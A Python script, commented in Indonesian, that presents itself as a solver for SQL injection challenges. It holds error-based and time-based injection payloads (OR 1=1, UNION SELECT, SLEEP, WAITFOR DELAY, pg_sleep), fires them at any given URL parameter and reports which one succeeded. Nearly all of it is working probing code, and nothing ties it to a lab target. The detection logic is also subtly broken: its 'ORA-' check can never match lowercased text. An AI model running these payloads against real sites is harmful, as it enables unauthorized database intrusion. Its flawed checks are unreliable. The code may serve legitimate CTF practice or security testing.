import requests
import time

class SQLiSolver:
    """
    Error/time-based SQLi solver.
    Menyelesaikan challenge SQL injection berbasis error dan waktu.
    """
    
    def __init__(self):
        self.sqli_payloads = {
            'error_based': [
                "' OR '1'='1",
                "' UNION SELECT null--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            'time_based': [
                "' OR IF(1=1,SLEEP(5),0)--",
                "'; WAITFOR DELAY '0:0:5'--",
                "' OR pg_sleep(5)--"
            ]
        }
    
    def solve_sqli_challenge(self, target_url: str, parameter: str):
        """
        Selesaikan challenge SQLi.
        """
        results = {
            'target_url': target_url,
            'parameter': parameter,
            'vulnerable': False,
            'technique_used': None,
            'payload_used': None,
            'solution_found': False
        }
        
        try:
            # Uji teknik berbasis error
            for payload in self.sqli_payloads['error_based']:
                if self._test_error_sqli(target_url, parameter, payload):
                    results.update({
                        'vulnerable': True,
                        'technique_used': 'error_based',
                        'payload_used': payload,
                        'solution_found': True
                    })
                    return results
            
            # Uji teknik berbasis waktu
            for payload in self.sqli_payloads['time_based']:
                if self._test_time_sqli(target_url, parameter, payload):
                    results.update({
                        'vulnerable': True,
                        'technique_used': 'time_based',
                        'payload_used': payload,
                        'solution_found': True
                    })
                    return results
        
        except Exception as e:
            results['error'] = f'SQLi solving failed: {str(e)}'
        
        return results
    
    def _test_error_sqli(self, url: str, param: str, payload: str) -> bool:
        """Uji SQLi berbasis error."""
        try:
            start_time = time.time()
            response = requests.get(url, params={param: payload}, timeout=10)
            end_time = time.time()
            
            # Cari indikator error database
            error_indicators = ['sql syntax', 'mysql_fetch', 'database error', 'ORA-']
            return any(indicator in response.text.lower() for indicator in error_indicators)
        except:
            return False
    
    def _test_time_sqli(self, url: str, param: str, payload: str) -> bool:
        """Uji SQLi berbasis waktu."""
        try:
            start_time = time.time()
            requests.get(url, params={param: payload}, timeout=15)
            end_time = time.time()
            
            # Periksa delay waktu
            return (end_time - start_time) >= 4.0
        except:
            return False